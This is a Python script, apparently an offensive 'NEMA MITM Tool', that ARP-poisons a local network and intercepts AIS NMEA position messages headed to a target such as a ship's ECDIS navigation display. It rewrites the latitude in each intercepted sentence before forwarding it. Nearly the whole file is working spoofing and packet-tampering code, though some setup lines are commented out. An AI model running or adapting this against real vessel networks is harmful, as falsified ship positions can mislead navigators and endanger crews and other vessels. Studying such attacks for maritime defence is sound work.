from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import time
import sys
import argparse
from pyais import *

class AIS_NMEA:
    def __init__(self, sentence):
        self.description = "AIS NMEA sentance handler"
        self.sentence = sentence
        self.decoded_dict = decode(sentence).asdict()
        self.ais_dict = decode(sentence).asdict()
        self.modified_sentence = encode_dict(self.ais_dict)

    def alter_field(self, field_name, field_value):
        self.ais_dict[field_name] = field_value
        self.modified_sentence = encode_dict(self.ais_dict, talker_id="AIVDM")


class MITM:
    def __init__(self, target_ip,  src_ip, iface):
        self.target_ip = target_ip
        self.src_ip = src_ip
        self.iface = iface
        self.src_mac = None
        self.target_mac = None
        self.nfqueue = NetfilterQueue()
        self.pkt = None

    #def payload_handle(self):

    def modify(self, packet):
        pkt = packet.get_payload()

        pktIP = IP(pkt)
        
        #pktIP.show()
        #payload = pktIP.getlayer(TCP).payload
        try:
            if pktIP.haslayer(TCP) and pktIP.src == self.src_ip and pktIP[TCP].dport == 4000 and str(pktIP[TCP].payload).startswith("!A"):
            
                    
                print(f"[*] Packet Intercepted with payload {pktIP[TCP].payload}")
                ais_data = AIS_NMEA(bytes(pktIP[TCP].payload))

                #print(f"[*] Decoded: {ais_data.decoded_dict}")
                old_len = len(pktIP[TCP].payload)
                pktIP[TCP].remove_payload()

                ais_data.alter_field('lat', 48.475577)
                pktIP[TCP].add_payload(ais_data.modified_sentence[0])
                print(f"\n packet modified..{pktIP[TCP].payload}")
                new_len = len(pktIP[TCP].payload)
                pktIP[IP].len = pktIP[IP].len + (new_len - old_len)
                del pktIP[IP].chksum
                del pktIP[TCP].chksum
                #del pktIP[TCP].len
                #pktIP.show2()
                pkt = pktIP.__class__(bytes(pktIP))
                packet.set_payload(bytes(pkt))
        except Exception as e:
            print(e)
           

        packet.accept()

    def setup(self):
        iptable_config = f"sudo iptables -A FORWARD -j NFQUEUE --queue-num 0 -d {self.target_ip}"
        ip_forward = "sudo sysctl net.ipv4.ip_forward=1"
        #os.system(iptable_config)
        #os.system(ip_forward)
        #self.nfqueue.bind(0, self.modify)

    def get_mac(self, ip):
        try:
            resp = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                        timeout=2, iface=self.iface, inter=0.1)

            return resp.hwsrc

        except Exception as e:
            print(f"[!] Could not find MAC address for {ip}")
            print(f"[!] Exiting....")

    def re_arp(self):
        try:
            print("[*] Restoring Targets MAC")
            send(ARP(op=2, pdst=self.target_ip, psrc=self.src_ip,
                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.src_mac), count=7)
            send(ARP(op=2, pdst=self.src_ip, psrc=self.target_ip,
                 hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target_mac), count=7)
        except Exception:
            print("[!] Error while restoring targets..")
            print("[!] Exiting.....")

    def arp_poison(self):
        try:
            print("[*] Starting ARP Poisoning")
            send(ARP(op=2, pdst=self.src_ip, psrc=self.target_ip, hwdst=self.src_mac))
            send(ARP(op=2, pdst=self.src_ip, psrc=self.target_ip, hwdst=self.src_mac))
        except Exception as e:
            print("[!] ARP Poisoning Failed...")
            print("[!] Exiting")

    def clean_up(self):
        print("[*] Flushing iptables")
        os.system('iptables -F')
        os.system('iptables -X')
        print("[*] Disabling IP forwarding")
        os.system("sudo sysctl net.ipv4.ip_forward=0")

    def start_mitm(self):
        try:

            self.src_mac = self.get_mac(self.src_ip)
            self.target_mac = self.get_mac(self.target_ip)

            print(f"[*] Getting MAC address of {self.src_ip}: {self.src_mac}")
            print(
                f"[*] Getting MAC address of {self.target_ip}: {self.target_mac}")
            while True:
                self.arp_poison()
                time.sleep(1.5)

        except Exception as e:
            print("[!] MITM failed..")
            self.clean_up()
            sys.exit(1)

    def stop_mitm(self):
        self.clean_up()


def get_input():
    parser = argparse.ArgumentParser(description="NEMA MITM Tool")
    parser.add_argument(
        "-t", "--target-ip", help="Target system IP address (Eg: ECDIS)", required=True)
    parser.add_argument("-s", "--source-ip",
                        help="Source system IP address", required=True)
    parser.add_argument("-i", "--interface",
                        help="Interface name", required=True)

    args = parser.parse_args()
    return args


if __name__ == '__main__':
    # ais_nmea = AIS_NMEA(b"!AIVDM,1,1,,A,13HOI:0P0000VOHLCnHQKwvL05Ip,0*23")
    # print(ais_nmea.sentence)
    # print(ais_nmea.decoded_dict)
    # ais_nmea.alter_field('lat', 48.475577)
    # print(bytes(ais_nmea.modified_sentence[0][0]))
    # print(type(ais_nmea.modified_sentence))
    # print(ais_nmea.ais_dict)

    args = get_input()

    mitm = MITM(args.target_ip, args.source_ip, args.interface)
    mitm.setup()
    mitm.start_mitm()

    try:
        print("[*] waiting for data")
        mitm.nfqueue.run()
        mitm.start_mitm()
    except KeyboardInterrupt:
        mitm.stop_mitm()

    mitm.nfqueue.unbind()
